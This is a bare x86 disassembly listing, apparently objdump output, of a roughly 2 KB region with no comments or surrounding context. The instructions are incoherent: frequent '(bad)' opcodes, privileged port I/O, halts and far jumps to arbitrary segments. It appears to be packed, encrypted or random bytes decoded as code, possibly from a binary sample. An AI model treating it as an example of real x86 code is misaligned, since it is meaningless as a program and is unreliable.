  4040ba:	xchg   esi,eax
  4040bb:	and    ecx,DWORD PTR [esi-0x6555332c]
  4040c1:	sub    edi,DWORD PTR [ebp+0x73]
  4040c4:	sbb    DWORD PTR [eax+eax*8-0x16],esi
  4040c8:	inc    esp
  4040c9:	sub    edi,edi
  4040cb:	xor    BYTE PTR [eax],cl
  4040cd:	scas   al,BYTE PTR es:[edi]
  4040ce:	cmp    BYTE PTR ds:0x263000b3,cl
  4040d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040d5:	popa   
  4040d6:	jge    0x40409f
  4040d8:	hlt    
  4040d9:	pop    eax
  4040da:	icebp  
  4040db:	mov    ds:0x9401128c,eax
  4040e0:	in     al,0x74
  4040e2:	scas   al,BYTE PTR es:[edi]
  4040e3:	fst    QWORD PTR [ebx+0xc]
  4040e6:	jae    0x40415a
  4040e8:	ret    
  4040e9:	and    ebp,esp
  4040eb:	daa    
  4040ec:	jb     0x4040fb
  4040ee:	jecxz  0x40410e
  4040f0:	pop    ss
  4040f1:	(bad)  
  4040f2:	dec    ebx
  4040f3:	inc    ebx
  4040f4:	xchg   BYTE PTR [edi+ebx*8],ah
  4040f7:	add    al,0x37
  4040f9:	(bad)
  4040fc:	dec    edx
  4040fd:	lods   al,BYTE PTR ds:[esi]
  4040fe:	push   ecx
  4040ff:	scas   eax,DWORD PTR es:[edi]
  404100:	sbb    al,0xc6
  404102:	sbb    BYTE PTR [ebx],dh
  404104:	sbb    ch,BYTE PTR [esi+edi*1]
  404107:	add    BYTE PTR [edi-0x43386094],dh
  40410d:	jnp    0x404099
  40410f:	fdiv   DWORD PTR [edi+ecx*4]
  404112:	lods   al,BYTE PTR ds:[esi]
  404113:	add    BYTE PTR [eax],cl
  404115:	stc    
  404116:	pop    eax
  404117:	out    dx,al
  404118:	pop    edx
  404119:	or     BYTE PTR [eax+0x11ee5789],0x6b
  404120:	addr16 xchg esp,eax
  404122:	or     eax,0x9c4dfcd6
  404127:	pop    edi
  404128:	popa   
  404129:	xor    al,0xe5
  40412b:	cwde   
  40412c:	xor    al,BYTE PTR [edx]
  40412e:	fdiv   QWORD PTR [esi-0x4c976554]
  404134:	dec    BYTE PTR [eax-0x770ea7ba]
  40413a:	repz add eax,DWORD PTR [ebx]
  40413d:	ds push cs
  40413f:	test   ch,dl
  404141:	shl    DWORD PTR [edx-0x1738bf53],0x36
  404148:	lods   eax,DWORD PTR ds:[esi]
  404149:	sbb    ah,dl
  40414b:	push   cs
  40414c:	inc    edi
  40414d:	jecxz  0x404127
  40414f:	xchg   edi,eax
  404150:	pop    esi
  404151:	pop    eax
  404152:	sub    bl,BYTE PTR [edi]
  404154:	sar    BYTE PTR [edx-0x46],1
  404157:	mov    eax,ds:0x716bfa62
  40415c:	adc    eax,0xc93df193
  404161:	jmp    0x9bc9:0xaee186c7
  404168:	jmp    0x7db5:0xb63b1afa
  40416f:	xchg   edx,eax
  404170:	cmp    DWORD PTR [ebx],ebp
  404172:	inc    ebp
  404173:	loop   0x40416b
  404175:	xor    ebp,DWORD PTR [ebx+0x53f44f7]
  40417b:	push   ebx
  40417c:	xor    dh,dh
  40417e:	test   DWORD PTR [esi],ebp
  404180:	dec    edi
  404181:	and    ah,BYTE PTR [esi]
  404183:	dec    ebp
  404184:	or     DWORD PTR [esp+ecx*8+0x4ea50e31],esi
  40418b:	or     DWORD PTR [ecx+0x24f4d833],ebp
  404191:	out    dx,eax
  404192:	out    0xf7,eax
  404194:	jo     0x404138
  404196:	ins    BYTE PTR es:[edi],dx
  404197:	sahf   
  404198:	jno    0x4041ca
  40419a:	(bad)  
  40419b:	jecxz  0x404149
  40419d:	inc    ebp
  40419e:	js     0x40414c
  4041a0:	sahf   
  4041a1:	pop    esp
  4041a2:	xchg   ecx,eax
  4041a3:	ror    DWORD PTR [edx],cl
  4041a5:	popf   
  4041a6:	lods   al,BYTE PTR ds:[esi]
  4041a7:	popa   
  4041a8:	inc    esp
  4041a9:	mov    eax,0xf19587be
  4041ae:	mov    bl,BYTE PTR ds:0x349353ae
  4041b4:	push   ecx
  4041b5:	xchg   ecx,eax
  4041b6:	in     al,0x87
  4041b8:	fs or  eax,0xb9bbda2b
  4041be:	mov    DWORD PTR [edx-0x1c],edx
  4041c1:	aaa    
  4041c2:	nop
  4041c3:	mov    DWORD PTR [eax],esp
  4041c5:	pushf  
  4041c6:	sbb    dl,BYTE PTR [edx+0x554942be]
  4041cc:	and    BYTE PTR [edx],0x26
  4041cf:	js     0x404172
  4041d1:	cmp    ah,BYTE PTR [esi-0x3]
  4041d4:	pop    es
  4041d5:	cmp    ebp,DWORD PTR [ebx-0x1c3eea24]
  4041db:	sub    ebx,ebx
  4041dd:	xor    DWORD PTR [edx],ecx
  4041df:	add    ebp,esi
  4041e1:	adc    edi,0x59
  4041e4:	dec    esp
  4041e5:	xor    ecx,edi
  4041e7:	ins    BYTE PTR es:[edi],dx
  4041e8:	push   ds
  4041e9:	jo     0x404241
  4041eb:	mov    ebx,?
  4041ed:	inc    eax
  4041ee:	lods   eax,DWORD PTR ds:[esi]
  4041ef:	push   ebp
  4041f0:	adc    DWORD PTR [edx-0x6fbc0612],ecx
  4041f6:	add    al,0xe1
  4041f8:	mov    dl,ah
  4041fa:	add    al,0x4b
  4041fc:	sar    esi,1
  4041fe:	inc    si
  404200:	jge    0x404218
  404202:	int    0xec
  404204:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404205:	push   ebx
  404206:	fdivr  st(4),st
  404208:	in     eax,0xe2
  40420a:	pusha  
  40420b:	inc    esp
  40420c:	clc    
  40420d:	das    
  40420e:	jo     0x404194
  404210:	lock jle 0x404254
  404213:	or     BYTE PTR [ebp-0x1c1b7657],cl
  404219:	mov    dh,0xff
  40421b:	aaa    
  40421c:	int    0x4b
  40421e:	neg    DWORD PTR [ebp-0x2b000d8b]
  404224:	mov    dl,0xfe
  404226:	xor    BYTE PTR [ebx+0x1a002660],0x4c
  40422d:	cmp    ch,BYTE PTR [esi+ecx*8+0x9]
  404231:	or     DWORD PTR [esi+0xe7ce12f],0xffffffb3
  404238:	leave  
  404239:	ror    BYTE PTR [edx+0x11630cde],cl
  40423f:	lods   eax,DWORD PTR ds:[esi]
  404240:	mov    esi,0x3b2f80bb
  404245:	jp     0x4041fb
  404247:	or     eax,0x6219d876
  40424c:	jo     0x404269
  40424e:	repnz iret 
  404250:	mov    bl,0xe1
  404252:	or     eax,0xdaa9c4cf
  404257:	adc    eax,0xd77337
  40425c:	adc    cl,BYTE PTR [edi+edx*8]
  40425f:	lock clc 
  404261:	cwde   
  404262:	outs   dx,BYTE PTR ds:[esi]
  404263:	bnd jns 0x40422b
  404266:	pop    edi
  404267:	cmp    edx,edx
  404269:	add    BYTE PTR [edi+0x2743d7e1],0xf5
  404270:	push   esp
  404271:	xchg   ebp,eax
  404272:	push   esp
  404273:	and    al,0x41
  404275:	cld    
  404276:	or     ebp,DWORD PTR [edx+eax*4+0x321b490f]
  40427d:	mov    dl,0xe9
  40427f:	xchg   esp,eax
  404280:	mov    eax,ds:0xcb266636
  404285:	shl    BYTE PTR [eax-0x2a],0x51
  404289:	mov    ah,0xfa
  40428b:	fld    DWORD PTR [eax]
  40428d:	adc    eax,DWORD PTR [ebp+0x56471ab9]
  404293:	es jecxz 0x404226
  404296:	pop    esi
  404297:	popa   
  404298:	pop    ebx
  404299:	fidiv  WORD PTR [edx-0x4e3498a4]
  40429f:	ins    DWORD PTR es:[edi],dx
  4042a0:	adc    BYTE PTR [ecx-0x4b92f130],ch
  4042a6:	sbb    edi,DWORD PTR [eax+0x74]
  4042a9:	mov    cs,WORD PTR [edx+0x16da1bda]
  4042af:	add    al,0xf1
  4042b1:	jmp    0x13f27cbd
  4042b6:	lahf   
  4042b7:	mov    esi,0x5d46c58a
  4042bc:	xchg   ecx,eax
  4042bd:	jno    0x40433c
  4042bf:	and    BYTE PTR [edx+ecx*4],cl
  4042c2:	push   es
  4042c3:	in     al,dx
  4042c4:	xchg   ebx,eax
  4042c5:	mov    bh,0xfb
  4042c7:	pop    ds
  4042c8:	cmp    ah,BYTE PTR [esi+0x564e77ac]
  4042ce:	cmp    dh,BYTE PTR [edi-0x16e2801b]
  4042d4:	enter  0x96c,0xc
  4042d8:	cmp    eax,0xad9a67da
  4042dd:	mov    WORD PTR [eax+0x1e1fc5f9],?
  4042e3:	sub    DWORD PTR [ebp+0x1b51b192],ecx
  4042e9:	inc    edx
  4042ea:	mov    es,edi
  4042ec:	daa    
  4042ed:	xchg   ebp,eax
  4042ee:	in     al,0xb0
  4042f0:	in     eax,0xb1
  4042f2:	dec    edx
  4042f3:	or     al,0xfc
  4042f5:	out    0x7b,eax
  4042f7:	test   eax,0xdb19acbc
  4042fc:	ret    0xe53b
  4042ff:	hlt    
  404300:	loop   0x40429f
  404302:	xchg   ecx,eax
  404303:	or     BYTE PTR [esi-0x19],dl
  404306:	pop    ebx
  404307:	xor    BYTE PTR [edi+0x65d0b442],al
  40430d:	js     0x404339
  40430f:	and    DWORD PTR [eax+0x6a140741],0x263215ef
  404319:	push   0xb8f16df3
  40431e:	jle    0x404324
  404320:	mov    bh,0x3d
  404322:	out    0x2d,eax
  404324:	push   es
  404325:	std    
  404326:	pop    ds
  404327:	ja     0x404330
  404329:	test   al,0x82
  40432b:	dec    eax
  40432c:	add    eax,0xcfd823e7
  404331:	and    BYTE PTR [eax+0x60],0xb1
  404335:	sbb    ebx,edx
  404337:	ret    0x162d
  40433a:	dec    ecx
  40433b:	cdq    
  40433c:	mov    eax,edi
  40433e:	pop    es
  40433f:	dec    esp
  404340:	xchg   edx,eax
  404341:	push   0xffffffa8
  404343:	popa   
  404344:	mov    eax,ds:0x827f2695
  40434a:	jg     0x4042db
  40434c:	pop    ds
  40434d:	mov    ebx,0xea7e8770
  404352:	es xor al,0x92
  404355:	in     al,dx
  404356:	xchg   ebp,eax
  404357:	jbe    0x40436f
  404359:	and    DWORD PTR [esi-0x7c],edi
  40435c:	lds    ebx,FWORD PTR [ecx-0x1a]
  40435f:	fimul  WORD PTR [edi-0x48]
  404362:	mov    cl,0xb5
  404364:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404365:	or     bl,BYTE PTR [esi+0x7b]
  404368:	pop    ebx
  404369:	in     al,0x2e
  40436b:	mov    BYTE PTR [eax-0x6d1d163f],dl
  404371:	outs   dx,DWORD PTR ds:[esi]
  404372:	cwde   
  404373:	adc    al,BYTE PTR [ebx+0x175c2b20]
  404379:	push   ss
  40437a:	dec    ecx
  40437b:	and    al,0x77
  40437d:	and    al,0xd1
  40437f:	sar    cl,0xcb
  404382:	lods   al,BYTE PTR ds:[esi]
  404383:	jns    0x404344
  404385:	add    edi,DWORD PTR [esi-0x22]
  404388:	or     BYTE PTR [esp+ebp*4],dh
  40438b:	mov    esi,0x9f2cc7d8
  404390:	pop    esi
  404391:	xchg   edi,eax
  404392:	out    dx,al
  404393:	xor    al,0x4e
  404395:	mov    ds:0x744c418f,eax
  40439a:	cwde   
  40439b:	loop   0x4043dc
  40439d:	mov    al,0xbd
  40439f:	pusha  
  4043a0:	scas   eax,DWORD PTR es:[edi]
  4043a1:	mov    cs,WORD PTR es:[eax+0x16]
  4043a5:	add    al,0x6d
  4043a7:	and    al,0xf0
  4043a9:	cs aas 
  4043ab:	adc    al,BYTE PTR [esi-0x58348a8a]
  4043b1:	shl    cl,cl
  4043b3:	stos   DWORD PTR es:[edi],eax
  4043b4:	fnstsw WORD PTR [ecx-0xe]
  4043b7:	adc    BYTE PTR [ebx+0x644873da],0x98
  4043be:	addr16 cdq 
  4043c0:	lahf   
  4043c1:	cmp    ah,dl
  4043c3:	or     dh,ah
  4043c5:	mov    al,ds:0xdce2115b
  4043ca:	cmp    ebx,esp
  4043cc:	stos   DWORD PTR es:[edi],eax
  4043cd:	or     WORD PTR [eax],bx
  4043d0:	mov    cl,0xd4
  4043d2:	ds inc eax
  4043d4:	bound  ecx,QWORD PTR [edi+0x416db936]
  4043da:	add    cl,dl
  4043dc:	sbb    DWORD PTR [eax-0x60],esp
  4043df:	add    dl,BYTE PTR [edi-0x2b2f3134]
  4043e5:	inc    eax
  4043e6:	inc    edx
  4043e7:	pop    ds
  4043e8:	push   ebx
  4043e9:	or     al,0xe6
  4043eb:	add    eax,0x7a30e7d3
  4043f0:	xchg   edx,eax
  4043f1:	mov    eax,ds:0xc5c73c43
  4043f6:	nop
  4043f7:	add    DWORD PTR [ebp+0x68f24198],edx
  4043fd:	push   ebx
  4043fe:	push   0x3c0d1c90
  404403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404404:	arpl   WORD PTR [ecx+0x6b],si
  404407:	mov    ds:0xa8b3f56e,al
  40440c:	jp     0x40442b
  40440e:	and    ebp,DWORD PTR [eax+0x70]
  404411:	bound  edi,QWORD PTR [esp+eax*1-0x30]
  404415:	jae    0x404466
  404417:	cdq    
  404418:	inc    esi
  404419:	jbe    0x4043e1
  40441b:	test   BYTE PTR [edi+0x6ef0bd87],dl
  404421:	xchg   BYTE PTR [esi],ah
  404423:	xchg   ebx,eax
  404424:	sbb    al,0x70
  404426:	adc    dh,ch
  404428:	add    bh,BYTE PTR [edx]
  40442a:	cmp    BYTE PTR [edi+0x811138c],al
  404430:	popf   
  404431:	sbb    eax,0x398689fb
  404436:	pop    ebp
  404437:	sub    cl,ah
  404439:	pushf  
  40443a:	mov    bl,0x97
  40443c:	push   ebx
  40443d:	into   
  40443e:	in     eax,0x63
  404440:	pop    ecx
  404441:	push   edx
  404442:	xchg   edx,eax
  404443:	fwait
  404444:	or     BYTE PTR [ebx-0x71b4e87d],ch
  40444a:	dec    esi
  40444b:	xchg   ecx,eax
  40444c:	push   cs
  40444d:	cli    
  40444e:	shl    bl,cl
  404450:	fxch   st(2)
  404452:	xor    esp,DWORD PTR [esi]
  404454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404455:	mov    eax,0x85f42867
  40445a:	sub    al,0x5f
  40445c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40445d:	std    
  40445e:	push   ecx
  40445f:	and    eax,0x45589315
  404464:	push   ebp
  404465:	std    
  404466:	test   eax,0xa8803f85
  40446b:	mov    DWORD PTR [eax+0x46338b6a],ebp
  404471:	or     ch,BYTE PTR [edx*2-0xf4b352d]
  404478:	test   BYTE PTR [ecx],dl
  40447a:	div    DWORD PTR [ecx+ebp*1-0x14]
  40447e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40447f:	lea    edi,[ecx-0x48fb0a47]
  404485:	xlat   BYTE PTR ds:[ebx]
  404486:	in     al,dx
  404487:	ins    DWORD PTR es:[edi],dx
  404488:	js     0x404485
  40448a:	lods   eax,DWORD PTR ds:[esi]
  40448b:	push   ds
  40448c:	mov    edx,0xcd561337
  404491:	mov    ebx,0xe6e24372
  404496:	jae    0x4044d9
  404498:	adc    al,0xbe
  40449a:	adc    ch,BYTE PTR [ecx]
  40449c:	mov    dl,0xb7
  40449e:	sbb    al,0xcd
  4044a0:	mov    WORD PTR [esi],?
  4044a2:	pop    DWORD PTR [edx+0x50]
  4044a5:	gs adc eax,0x49b3b867
  4044ab:	add    ebx,DWORD PTR [eax-0x1b]
  4044ae:	dec    edi
  4044af:	ficom  DWORD PTR [ebx+0x72be3fb1]
  4044b5:	and    DWORD PTR [ebp-0x7227c0b2],edi
  4044bb:	bound  eax,QWORD PTR [ebp-0x4c403d55]
  4044c1:	sub    esi,DWORD PTR [ebx]
  4044c3:	jno    0x404477
  4044c5:	in     eax,dx
  4044c6:	xchg   ecx,eax
  4044c7:	aam    0xe0
  4044c9:	bswap  esp
  4044cb:	jno    0x404543
  4044cd:	aaa    
  4044ce:	retf   0xf5e2
  4044d1:	pop    ss
  4044d2:	sub    bl,dh
  4044d4:	popa   
  4044d5:	(bad)  
  4044d6:	mov    WORD PTR [bx],ss
  4044d9:	push   ebp
  4044da:	xlat   BYTE PTR ds:[ebx]
  4044db:	xor    eax,0xeec6bac2
  4044e0:	retf   0xe9f9
  4044e3:	outs   dx,BYTE PTR ds:[esi]
  4044e4:	addr16 jo 0x4044f8
  4044e7:	lahf   
  4044e8:	or     edx,0xeac8d338
  4044ee:	inc    eax
  4044ef:	lahf   
  4044f0:	or     al,0xae
  4044f2:	lods   eax,DWORD PTR ds:[esi]
  4044f3:	sti    
  4044f4:	addr16 mov ds:0xc9e0,eax
  4044f8:	mov    ecx,0xcef1be0d
  4044fd:	pop    ebp
  4044fe:	mov    dl,0x25
  404500:	sub    eax,eax
  404502:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404503:	pop    esp
  404504:	or     al,0xd5
  404506:	aad    0x5e
  404508:	dec    edx
  404509:	pop    ebp
  40450a:	push   0xfffffffb
  40450c:	inc    edx
  40450d:	xchg   esp,eax
  40450e:	outs   dx,BYTE PTR ds:[esi]
  40450f:	inc    esp
  404510:	cmp    bh,0x5b
  404513:	xor    ebp,DWORD PTR [ecx]
  404515:	pop    es
  404516:	push   ss
  404517:	call   0x861c8238
  40451c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40451d:	mov    ebx,0x8cc3cba4
  404522:	in     eax,0x56
  404524:	test   ah,bh
  404526:	inc    esp
  404527:	out    0x2e,al
  404529:	inc    esp
  40452a:	push   ss
  40452b:	cwde   
  40452c:	les    edi,FWORD PTR [edx+0x6a]
  40452f:	and    eax,0xfdb09417
  404534:	dec    ecx
  404535:	sbb    al,BYTE PTR [edi-0x71]
  404538:	jecxz  0x4045b2
  40453a:	cmp    eax,0x6766a9ab
  40453f:	pop    es
  404540:	sub    ah,BYTE PTR [edx+eax*1-0x3a]
  404544:	aas    
  404545:	cs mov ebx,0x8c6e878d
  40454b:	jns    0x404545
  40454d:	(bad)  
  40454e:	inc    ebx
  40454f:	ins    DWORD PTR es:[edi],dx
  404550:	mov    bl,0xfc
  404552:	xchg   ebp,ebp
  404554:	cmp    esi,DWORD PTR cs:[ecx]
  404557:	push   ecx
  404558:	pushf  
  404559:	xchg   ebp,eax
  40455a:	jmp    FWORD PTR [esi]
  40455c:	and    ch,BYTE PTR [ecx]
  40455e:	icebp  
  40455f:	push   es
  404560:	mov    al,0xbc
  404562:	push   esi
  404563:	jno    0x404507
  404565:	icebp  
  404566:	mov    edx,ds
  404568:	mov    ah,bh
  40456a:	push   0x2a
  40456c:	imul   edi,DWORD PTR [eax-0x6dad6cfb],0x76
  404573:	mov    ah,0xaa
  404575:	pop    ss
  404576:	dec    esi
  404577:	into   
  404578:	int3   
  404579:	pop    ebp
  40457a:	push   cs
  40457b:	test   BYTE PTR [ebx],al
  40457d:	stos   BYTE PTR es:[edi],al
  40457e:	out    dx,eax
  40457f:	push   0xffffffda
  404581:	call   0x1906:0xe1dc410f
  404588:	mov    edx,eax
  40458a:	bound  edi,QWORD PTR [edi]
  40458c:	add    BYTE PTR [eax],ah
  40458e:	sahf   
  40458f:	or     eax,0xca39c1a4
  404594:	inc    esp
  404595:	dec    ebx
  404596:	in     eax,dx
  404597:	bound  ebp,QWORD PTR [ecx+eax*2+0x500b42b6]
  40459e:	sub    al,0x1a
  4045a1:	jecxz  0x4045d4
  4045a3:	jg     0x404623
  4045a5:	sub    ch,BYTE PTR [edi+eax*1+0xb900120]
  4045ac:	(bad)  
  4045ad:	jp     0x4045e9
  4045af:	out    dx,al
  4045b0:	inc    eax
  4045b1:	push   0x63
  4045b3:	test   eax,0x51526467
  4045b8:	fst    DWORD PTR ds:0x3c23b3b4
  4045be:	mov    ebp,0xeb6ae5e1
  4045c3:	jl     0x4045d2
  4045c5:	push   ebp
  4045c6:	jg     0x4045cd
  4045c8:	sub    DWORD PTR [esi],ebp
  4045ca:	pslld  mm5,QWORD PTR [esi-0x76]
  4045ce:	xchg   edx,eax
  4045cf:	aam    0x22
  4045d1:	add    DWORD PTR [ebx],edi
  4045d3:	mov    DWORD PTR [ebp+0x63a56277],edx
  4045d9:	fldenv [esi+0x5b6e1535]
  4045df:	xchg   edx,esp
  4045e1:	inc    ecx
  4045e2:	fsub   QWORD PTR [edx+0x34]
  4045e5:	test   al,0xd5
  4045e7:	leave  
  4045e8:	or     DWORD PTR cs:[ecx+0x6d],esi
  4045ec:	dec    edi
  4045ed:	mov    eax,ds:0x5848e923
  4045f2:	test   bl,cl
  4045f4:	sti    
  4045f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045f6:	stc    
  4045f7:	or     ebx,DWORD PTR [ebx+0x2b9b8b4e]
  4045fd:	and    al,0xc0
  4045ff:	popa   
  404600:	add    eax,0xf17fbdb4
  404605:	jne    0x4045b6
  404607:	inc    esp
  404608:	call   0xf38c:0xdfca69b7
  40460f:	aas    
  404610:	jns    0x4045fd
  404612:	(bad)  
  404613:	js     0x404666
  404615:	inc    ebx
  404616:	add    DWORD PTR [eax],0x31
  404619:	jecxz  0x404603
  40461b:	test   al,0x6
  40461d:	addr16 pop edi
  40461f:	add    eax,0xf4b40f5f
  404624:	loop   0x404630
  404626:	sahf   
  404627:	add    BYTE PTR [ebx],cl
  404629:	(bad)  
  40462a:	in     eax,0xe2
  40462c:	je     0x404659
  40462e:	enter  0xdea8,0xba
  404632:	(bad)  [ebp+edx*8-0x55433a0b]
  404639:	into   
  40463a:	pop    edi
  40463b:	push   es
  40463c:	lock ss jmp 0x2550:0x9486d5dc
  404645:	mov    ch,0xf3
  404647:	ins    BYTE PTR es:[edi],dx
  404648:	jmp    0x4f1e:0x27ef6f52
  40464f:	cmp    eax,0xee46a6c
  404654:	xlat   BYTE PTR ds:[ebx]
  404655:	cmp    eax,0xba859016
  40465a:	popa   
  40465b:	push   cs
  40465c:	push   ds
  40465d:	sti    
  40465e:	xor    BYTE PTR [edx],dl
  404660:	inc    eax
  404661:	cmp    BYTE PTR [esi-0x79],0x99
  404665:	je     0x4045eb
  404667:	out    dx,al
  404668:	pushf  
  404669:	fldcw  WORD PTR [eax+eiz*2+0x76]
  40466d:	add    eax,0xdebb9a1
  404672:	mov    edx,0x16eeba4
  404677:	jo     0x404682
  404679:	mov    eax,0xb728ece9
  40467e:	and    al,0x27
  404680:	(bad)  
  404682:	scas   eax,DWORD PTR es:[edi]
  404683:	push   ds
  404684:	jbe    0x4046aa
  404686:	mov    dh,0xb3
  404688:	pop    ds
  404689:	pop    ebx
  40468a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40468b:	pop    eax
  40468c:	adc    esp,eax
  40468e:	lahf   
  40468f:	mov    bh,0x93
  404691:	into   
  404692:	and    eax,0x1be9bb45
  404697:	cmp    al,BYTE PTR [eax-0x58a7e3c5]
  40469d:	mov    ds:0xb4b7fa68,eax
  4046a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046a3:	push   es
  4046a4:	xchg   BYTE PTR [esi],dl
  4046a6:	push   ecx
  4046a8:	push   edi
  4046a9:	pushf  
  4046aa:	cdq    
  4046ab:	xlat   BYTE PTR ds:[ebx]
  4046ac:	scas   al,BYTE PTR es:[edi]
  4046ad:	cmp    eax,0x6b3098bc
  4046b2:	mov    esp,0x2792ca5c
  4046b7:	pushf  
  4046b8:	fwait
  4046b9:	retf   0x9812
  4046bc:	mov    eax,ds:0x8c6521a0
  4046c1:	rep outs dx,DWORD PTR ds:[esi]
  4046c3:	loop   0x404700
  4046c5:	shl    BYTE PTR [edi+ecx*4-0x4c],1
  4046c9:	shr    esp,1
  4046cb:	jns    0x404727
  4046cd:	mov    ah,0x1e
  4046cf:	imul   esp,DWORD PTR [ecx],0xffffffee
  4046d2:	mov    dl,0xa7
  4046d4:	repz cmp eax,0x786d75a3
  4046da:	outs   dx,DWORD PTR ds:[esi]
  4046db:	sbb    al,BYTE PTR [ebp+0x36703664]
  4046e1:	shl    DWORD PTR [ecx+0x23],cl
  4046e4:	push   eax
  4046e5:	pop    ss
  4046e6:	adc    ah,BYTE PTR [esi]
  4046e8:	adc    eax,0x29
  4046eb:	shr    BYTE PTR [ebp-0x55138648],0x8a
  4046f2:	inc    esp
  4046f3:	mov    bh,0xa1
  4046f5:	je     0x40467f
  4046f7:	dec    eax
  4046f8:	ins    DWORD PTR es:[edi],dx
  4046f9:	inc    ecx
  4046fa:	mov    al,ds:0x344c100b
  4046ff:	xchg   BYTE PTR [eax],cl
  404701:	fs sti 
  404703:	push   0x725017ad
  404708:	mov    ds:0x21bdfaa3,ax
  40470e:	xlat   BYTE PTR ds:[ebx]
  40470f:	scas   al,BYTE PTR es:[edi]
  404710:	gs aad 0xbc
  404713:	retf   0x6725
  404716:	xchg   edi,eax
  404717:	pop    esp
  404718:	pop    edx
  404719:	add    al,0xd1
  40471b:	hlt    
  40471c:	pop    ebp
  40471d:	xchg   ebx,eax
  40471e:	das    
  40471f:	stos   BYTE PTR es:[edi],al
  404720:	cmc    
  404721:	aam    0x33
  404723:	stos   DWORD PTR es:[edi],eax
  404724:	arpl   ax,si
  404726:	pop    ebp
  404727:	in     al,dx
  404728:	sub    eax,0x72399702
  40472d:	adc    edx,DWORD PTR [eax]
  40472f:	adc    eax,0x1daf23e5
  404734:	xor    al,BYTE PTR [edx-0x17]
  404737:	xchg   BYTE PTR [ecx-0x200513d8],ah
  40473d:	test   DWORD PTR [ecx+0x4d],0xbf9a6ed2
  404744:	xchg   esi,eax
  404745:	mov    ah,0x66
  404747:	mov    edi,0xcf544e6e
  40474d:	or     DWORD PTR ss:[edx-0x51],0x67
  404752:	pusha  
  404753:	push   ebx
  404754:	sahf   
  404755:	push   ebp
  404756:	mov    bh,0x64
  404758:	xchg   ebx,eax
  404759:	jmp    0xa8c3:0x344faadd
  404760:	repnz loope 0x404757
  404763:	push   ecx
  404764:	inc    ecx
  404765:	push   es
  404766:	leave  
  404767:	sub    bl,BYTE PTR [edx+0x5d464ac9]
  40476d:	fisub  DWORD PTR [esi-0x70d04f75]
  404773:	fsub   QWORD PTR [ecx-0x4421a0ab]
  404779:	mov    esp,0xaea900dc
  40477e:	sar    BYTE PTR [ebp-0x1077f5bc],0xa6
  404785:	ins    BYTE PTR es:[edi],dx
  404786:	retf   0x9f47
  404789:	js     0x404726
  40478b:	hlt    
  40478c:	push   edx
  40478d:	cmp    ebx,DWORD PTR [edx]
  40478f:	aam    0x85
  404791:	sbb    al,ah
  404793:	push   esi
  404794:	and    ecx,DWORD PTR [esi-0x43124ddc]
  40479a:	fwait
  40479b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40479c:	xchg   ebx,eax
  40479d:	stc    
  40479e:	repnz or ch,BYTE PTR [edi-0x713b6511]
  4047a5:	pop    ebp
  4047a6:	mov    esi,ebx
  4047a8:	scas   eax,DWORD PTR es:[edi]
  4047a9:	js     0x4047c6
  4047ab:	int    0x86
  4047ad:	loope  0x404756
  4047af:	pop    esp
  4047b0:	fbstp  TBYTE PTR [esi-0x5f]
  4047b3:	(bad)  [eax+0x526c0537]
  4047b9:	ret    0xbfb1
  4047bc:	and    ecx,DWORD PTR [ecx+0x31]
  4047bf:	ror    DWORD PTR [esi+0xd4d99bf],1
  4047c5:	mov    ds:0x8e4d7e4b,eax
  4047ca:	pop    ebp
  4047cb:	nop
  4047cc:	mov    ah,0xe6
  4047ce:	or     DWORD PTR [edx+eiz*2+0x4f],edi
  4047d2:	sub    ecx,edx
  4047d4:	cli    
  4047d5:	fidivr DWORD PTR [ecx+0x61]
  4047d8:	(bad)  
  4047d9:	mov    esp,0x5f8caf5c
  4047de:	or     esi,DWORD PTR [esi+esi*2]
  4047e1:	dec    edx
  4047e2:	aaa    
  4047e3:	mov    al,ds:0x17b7c4f2
  4047e8:	outs   dx,BYTE PTR ds:[esi]
  4047e9:	dec    esp
  4047ea:	jmp    0xe29551a
  4047ef:	fiadd  WORD PTR [eax]
  4047f1:	fs jle 0x40481e
  4047f4:	ret    0xc2c6
  4047f7:	(bad)  
  4047f8:	mov    bh,0xbb
  4047fa:	retf   0x99be
  4047fd:	mov    eax,0x446b2a85
  404802:	in     al,dx
  404803:	stos   BYTE PTR es:[edi],al
  404804:	ja     0x404882
  404806:	mov    dl,0x94
  404808:	push   ebp
  404809:	pusha  
  40480a:	push   esp
  40480b:	push   es
  40480c:	cdq    
  40480d:	sbb    esi,DWORD PTR [ebx+0x5e54a82b]
  404813:	bnd jp 0x4047f9
  404816:	inc    edi
  404817:	popa   
  404818:	cmp    ebx,DWORD PTR [ebx+0x1e]
  40481b:	push   eax
  40481c:	(bad)  
  40481d:	sub    DWORD PTR [edi-0x6e71de2],ebp
  404823:	xor    BYTE PTR [ecx-0xd6b03b6],0x88
  40482a:	jmp    0x4047e3
  40482c:	inc    edi
  40482d:	sub    dh,BYTE PTR [ecx-0x57]
  404830:	cli    
  404831:	xor    BYTE PTR [ebp+0x1f],0x28
  404835:	cmp    BYTE PTR [ecx-0x5de0f242],ch
  40483b:	inc    ecx
  40483c:	jae    0x4048a9
  40483e:	or     ecx,DWORD PTR [ecx+0x63]
  404841:	outs   dx,BYTE PTR ds:[esi]
  404842:	inc    edx
  404843:	push   ebx
  404844:	xchg   ebx,eax
  404845:	lgs    esi,FWORD PTR [ebp-0x64e55eaf]
  40484c:	and    BYTE PTR [ecx],0x80
  40484f:	es jp  0x404869
  404852:	or     al,0x28
  404854:	mov    ds:0x3e7b3c24,al
  404859:	jnp    0x4047e0
  40485b:	cmp    ebp,DWORD PTR [edi+0x38]
  40485e:	mov    al,0x16
  404860:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404861:	in     eax,dx
  404862:	aad    0xfc
  404864:	es xchg ebp,eax
  404866:	fnstsw WORD PTR [esi]
  404868:	fstp   TBYTE PTR [eax-0x421adb60]
